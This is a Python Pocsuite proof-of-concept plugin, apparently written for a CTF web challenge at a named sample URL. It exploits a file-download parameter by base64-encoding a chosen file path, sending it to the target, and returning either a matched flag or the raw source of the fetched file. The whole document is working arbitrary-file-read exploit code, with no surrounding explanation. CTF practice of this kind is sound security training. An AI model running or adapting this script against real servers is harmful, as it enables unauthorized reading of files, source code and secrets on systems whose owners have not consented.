import re
import urlparse
import base64
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    appName='CTF'
    name='UploadFile'
    vulID='00000'
    version='1.0'
    author='LzSkyline'
    vulDate='0000-00-00'
    createDate='2017-09-25'
    updateDate='2017-09-25'
    references=['https://www.seebug.org/vuldb/ssvid-00000']
    appPowerLink='https://www.lzskyline.com'
    appVersion='0.0.0'
    vulType='Others'
    desc='https://www.seebug.org/'
    samples=['http://way.nuptzj.cn/web6/']

    def _attack(self):
        # if not self.params["target"]: return
        result={}
        vulurl=self.url
        payload=base64.b64encode(self.params["target"])
        param={self.params["var"]:payload}
        resp=req.get(vulurl,params=param)

        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['Flag']=self.params['name'] + "{" + match_result.group(1) + "}"
        else:
            if resp.status_code == 200:
                result['FlagInfo']={}
                result['FlagInfo']['FileSource']="\n" + resp.content
        return self.parse_attack(result)

    def _verify(self):
        # if not self.params["target"]: return
        result={}
        vulurl=self.url
        payload=base64.b64encode(self.params["target"])
        param={self.params["var"]:payload}
        resp=req.get(vulurl,params=param)
        if resp.status_code == 200:
            result['FlagInfo']={}
            result['FlagInfo']['b64Download']="Yes"
        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
